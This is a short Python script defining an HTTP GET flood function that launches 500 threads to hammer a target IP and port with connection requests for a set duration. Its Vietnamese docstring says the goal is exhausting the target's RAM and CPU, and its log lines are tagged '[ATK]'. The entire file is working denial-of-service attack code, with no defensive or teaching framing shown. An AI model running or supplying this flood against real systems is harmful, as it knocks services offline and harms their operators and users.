import socket
import time
import threading
import random


def http_flood(target_ip, target_port, duration, stop_flag):
    """HTTP GET flood - 500 threads spam request gây cạn RAM/CPU."""
    print(f"[ATK] HTTP Flood → {target_ip}:{target_port} ({duration}s)")
    end = time.time() + duration
    sent = [0]
    paths = ["/", "/index.html"]

    def worker():
        while time.time() < end and not stop_flag.is_set():
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            try:
                s.connect((target_ip, target_port))
                path = random.choice(paths)
                req = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    "User-Agent: Mozilla/5.0\r\n"
                    "Accept: */*\r\n"
                    "Connection: close\r\n\r\n"
                )
                s.send(req.encode())
                s.recv(1)
                sent[0] += 1
            except:
                pass
            finally:
                s.close()

    threads = []
    for _ in range(500):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    print(f"[ATK] HTTP done. {sent[0]} requests.")
